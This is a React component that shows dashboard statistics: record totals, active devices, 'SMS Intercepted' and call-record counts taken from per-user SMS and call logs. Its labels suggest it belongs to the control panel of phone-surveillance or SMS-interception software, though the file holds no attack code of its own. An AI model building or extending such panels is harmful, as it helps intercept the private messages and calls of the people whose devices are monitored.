import React from 'react';
import { Users, Activity, MessageSquare, PhoneCall, CreditCard } from 'lucide-react';

export default function StatCards({ users }) {
  const totalUsers = users.length;
  const activeUsers = users.filter(u => u.isActive || u.isOnline).length;
  const totalSms = users.reduce((acc, u) => acc + (u.smsLogs?.length || 0), 0);
  const totalCalls = users.reduce((acc, u) => acc + (u.callLogs?.length || 0), 0);

  return (
    <div className="metrics-grid">
      <div className="glass-panel metric-card">
        <div className="metric-info">
          <p>Total Records</p>
          <h3>{totalUsers}</h3>
        </div>
        <div className="metric-icon-wrapper" style={{ background: 'linear-gradient(135deg, #6366F1 0%, #4F46E5 100%)' }}>
          <Users size={24} />
        </div>
      </div>

      <div className="glass-panel metric-card">
        <div className="metric-info">
          <p>Active Devices</p>
          <h3 style={{ color: '#34d399' }}>{activeUsers}</h3>
        </div>
        <div className="metric-icon-wrapper" style={{ background: 'linear-gradient(135deg, #10B981 0%, #059669 100%)' }}>
          <Activity size={24} />
        </div>
      </div>

      <div className="glass-panel metric-card">
        <div className="metric-info">
          <p>SMS Intercepted</p>
          <h3>{totalSms}</h3>
        </div>
        <div className="metric-icon-wrapper" style={{ background: 'linear-gradient(135deg, #8B5CF6 0%, #7C3AED 100%)' }}>
          <MessageSquare size={24} />
        </div>
      </div>

      <div className="glass-panel metric-card">
        <div className="metric-info">
          <p>Call Records</p>
          <h3>{totalCalls}</h3>
        </div>
        <div className="metric-icon-wrapper" style={{ background: 'linear-gradient(135deg, #EC4899 0%, #DB2777 100%)' }}>
          <PhoneCall size={24} />
        </div>
      </div>
    </div>
  );
}
